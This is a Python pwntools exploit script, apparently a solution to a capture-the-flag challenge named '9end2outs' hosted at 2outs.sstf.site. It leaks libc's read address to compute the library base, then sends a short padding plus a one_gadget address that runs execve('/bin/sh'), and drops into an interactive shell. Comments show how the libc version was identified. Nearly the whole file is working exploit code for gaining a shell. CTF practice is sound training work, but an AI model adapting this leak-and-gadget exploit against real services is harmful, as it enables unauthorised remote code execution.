#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./9end2outs_patched")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    # nc 2outs.sstf.site 1337
    host = args.HOST or '2outs.sstf.site'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

io.sendline(b"read")
io.recvuntil(b"at 0x")
leak_read = int(io.recvuntil(b".")[:-1], 16)
libc.address = leak_read - libc.symbols["read"]
log.info(f"{libc.address=:#x}")

io.sendline(b"puts")

"""
# get libc version
$ pwn libcdb lookup read 0x7f1126f50980 puts 0x7f1126ebced0

# choose either one, all the results have the same symbol offset
$ pwn libcdb hash -t sha1 --download-libc --unstrip 69389d485a9793dbe873f0ea2c93e02efaa9aa3d
"""

"""
0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
"""
one_gadget = libc.address + 0xebcf8

pad = 0x8
payload = b"A" * pad
payload += p64(one_gadget)

io.sendline(payload)

io.interactive()
